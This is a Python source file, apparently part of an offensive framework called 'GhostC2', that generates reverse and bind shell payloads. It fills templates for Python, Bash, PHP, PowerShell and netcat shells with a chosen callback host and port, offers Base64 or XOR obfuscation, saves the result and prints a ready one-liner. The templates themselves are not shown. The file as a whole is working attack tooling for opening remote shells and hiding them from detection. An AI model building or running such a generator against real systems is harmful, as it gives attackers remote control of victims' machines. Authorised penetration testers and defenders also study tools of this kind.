import os
from payloads.encoder import ENCODERS
from utils.helpers import validate_ip, validate_port, get_local_ip

TEMPLATES_DIR = os.path.join(os.path.dirname(__file__), "templates")
OUTPUT_DIR = os.path.join(os.path.dirname(__file__), "output")

LANGUAGES = {
    "1": ("Python Reverse",    "python_reverse.py",    "python"),
    "2": ("Bash Reverse",      "bash_reverse.sh",      "bash"),
    "3": ("PHP Reverse",       "php_reverse.php",      "php"),
    "4": ("PowerShell Reverse","powershell_reverse.ps1","powershell"),
    "5": ("Python Bind",       "python_bind.py",       "python"),
    "6": ("Netcat Oneliners",  "nc_oneliner.txt",      "bash"),
}


def load_template(filename):
    path = os.path.join(TEMPLATES_DIR, filename)
    with open(path) as f:
        return f.read()


def fill_template(template, lhost, lport):
    return template.replace("{{LHOST}}", lhost).replace("{{LPORT}}", str(lport))


def save_payload(content, filename):
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    path = os.path.join(OUTPUT_DIR, filename)
    with open(path, "w") as f:
        f.write(content)
    return path


def generate(lhost=None, lport=None, language=None, encoding="none", logger=None):
    """Interactive payload generator."""
    from utils.logger import Logger
    log = logger or Logger()

    log.section("GhostC2 Payload Generator")

    # LHOST
    default_ip = get_local_ip()
    if not lhost:
        lhost = input(f"\n  LHOST [{default_ip}]: ").strip() or default_ip
    if not validate_ip(lhost):
        log.error(f"Invalid IP: {lhost}")
        return None, None

    # LPORT
    if not lport:
        lport = input("  LPORT [4444]: ").strip() or "4444"
    if not validate_port(lport):
        log.error(f"Invalid port: {lport}")
        return None, None
    lport = int(lport)

    # Language
    if not language:
        print("\n  Payload type:")
        for key, (name, _, _) in LANGUAGES.items():
            print(f"    [{key}] {name}")
        choice = input("\n  Select [1-6]: ").strip()
        if choice not in LANGUAGES:
            log.error("Invalid choice")
            return None, None
    else:
        # Match by name
        choice = next((k for k, (n, _, _) in LANGUAGES.items() if language.lower() in n.lower()), "1")

    lang_name, template_file, lang_type = LANGUAGES[choice]

    # Encoding
    print("\n  Obfuscation:")
    print("    [1] None (raw)")
    print("    [2] Base64")
    print("    [3] XOR (key=0x41)")
    enc_choice = input("\n  Select [1-3, default 1]: ").strip() or "1"
    enc_map = {"1": "none", "2": "base64", "3": "xor"}
    encoding = enc_map.get(enc_choice, "none")

    # Generate
    template = load_template(template_file)
    payload = fill_template(template, lhost, lport)

    # Encode
    if encoding != "none" and lang_type in ("python", "bash", "powershell"):
        encoder = ENCODERS[encoding]
        oneliner = encoder(payload, language=lang_type)
    else:
        oneliner = payload

    # Save
    out_filename = template_file.replace("{{LHOST}}", lhost).replace("{{LPORT}}", str(lport))
    saved_path = save_payload(payload, out_filename)

    log.success(f"Payload saved → {saved_path}")
    log.success(f"LHOST: {lhost} | LPORT: {lport} | Type: {lang_name} | Encoding: {encoding}")

    print(f"\n  {'─'*55}")
    print(f"  📋 One-liner / Payload:\n")
    print(f"  {oneliner}\n")
    print(f"  {'─'*55}")

    return saved_path, oneliner
